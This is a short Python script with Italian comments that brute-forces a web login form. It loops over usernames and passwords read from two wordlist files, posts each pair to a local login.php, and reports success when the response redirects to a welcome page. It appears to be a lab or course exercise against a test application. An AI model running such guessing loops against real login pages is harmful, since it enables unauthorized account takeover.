import requests # moduli http.client e urllib.parse sono stati sostituiti dal modulo requests su link: https://requests.readthedocs.io/en/latest/user/install/

username_file = open("nomi_utenti.txt")      
password_file = open("password.txt")

user_list = username_file.readlines()
pwd_list = password_file.readlines()
stopit = False

for user in user_list:
    user = user.rstrip()
    if stopit:
        break
    for pwd in pwd_list:
        pwd = pwd.rstrip()
        if stopit:
            break
        print(f"{user} - {pwd}")

        post_parameters = {'username': user, 'password': pwd, 'Submit': 'Submit'}
        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html, application/xhtml+xml"}
        response = requests.post('http://127.0.0.1/login.php', data=post_parameters, headers=headers) #non ci sarà più bisogno di aggiungere "conn =" e "conn.request"

        if response.url.endswith('benvenuto.php'):
            print(f"logged with {user} - {pwd}")
            stopit = True
            break 


username_file.close()
password_file.close()